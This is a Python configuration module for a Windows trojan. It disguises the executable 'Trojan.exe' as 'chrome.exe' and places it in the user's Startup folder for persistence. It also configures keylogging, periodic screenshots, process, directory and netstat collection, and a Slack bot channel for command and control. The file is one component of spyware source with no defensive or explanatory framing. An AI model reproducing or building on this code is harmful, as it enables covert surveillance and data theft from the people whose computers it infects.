import getpass, sys, os
from os import path
from slack_bot_data import (
    SLACK_APP_TOKEN,
    SLACK_BOT_TOKEN,
    SLACK_SIGNING_SECRET,
    BASE_CHANNEL_ID,
)

class Config:
    def __init__(self):
        # File paths and unique user data
        self.__computerName = os.environ['COMPUTERNAME']
        self.__userName = getpass.getuser()
        self.__fileName = "Trojan.exe" # In reality, "chrome.exe"
        self.__filePath = f"c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.__logFileName = "log.txt"
        self.__dirlist = "dirlist.csv"
        self.__processList = "process_list.csv"
        self.__netstat = "netstat.csv"
        self.__logPath = f"c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\"
        self.__screenshotPath = self.logPath
        self.__currentDir = path.dirname(sys.executable)
        self.__currentPath = self.currentDir + f"\\{self.__fileName}"
        
        # Screen capture and keylogger
        self.__keyloggingIsActive = False
        self.__screenshotFrequency = 5
        
        # Slack Communication
        self.__channelName = None
        self.__channelId = BASE_CHANNEL_ID
        self.__channelSecret = SLACK_SIGNING_SECRET
        self.__botToken = SLACK_BOT_TOKEN
        self.__appToken = SLACK_APP_TOKEN
        self.__channelJson = "ch.json"

      
# File and user properties
    @property
    def userName(self):
        return self.__userName
    
    @property
    def computerName(self):
        return self.__computerName
    
    @property
    def fileName(self):
        return self.__fileName
    
    @property
    def filePath(self):
        return self.__filePath

    @property
    def logFileName(self):
        return self.__logFileName

    @property
    def dirlist(self):
        return self.__dirlist
    @property
    def processList(self):
        return self.__processList    
    @property
    def netstat(self):
        return self.__netstat
    @property
    def logPath(self):
        return self.__logPath

    @property
    def screenshotPath(self):
        return self.__screenshotPath

    @property
    def currentDir(self):
        return self.__currentDir

    @property
    def currentPath(self):
        return self.__currentPath
    
#Keylog and screenshots properties

    @property
    def screenshotFrequency(self):
        return self.__screenshotFrequency

    @screenshotFrequency.setter
    def screenshotFrequency(self, value):
        self.__screenshotFrequency = value
    
    @property
    def keyloggingIsActive(self):
        return self.__keyloggingIsActive

    @keyloggingIsActive.setter
    def keyloggingIsActive(self, value):
        self.__keyloggingIsActive = value
# Communication properties 
    @property
    def channelName(self):
        return self.__channelName
    
    @channelName.setter
    def channelName(self, value):
        self.__channelName = value
        
    @property
    def channelId(self):
        return self.__channelId
    
    @channelId.setter
    def channelId(self, value):
        self.__channelId = value
        
    @property
    def channelSecret(self):
        return self.__channelSecret
    
    @property
    def botToken(self):
        return self.__botToken
    
    @property
    def appToken(self):
        return self.__appToken
    
    @property
    def channelJson(self):
        return self.__channelJson
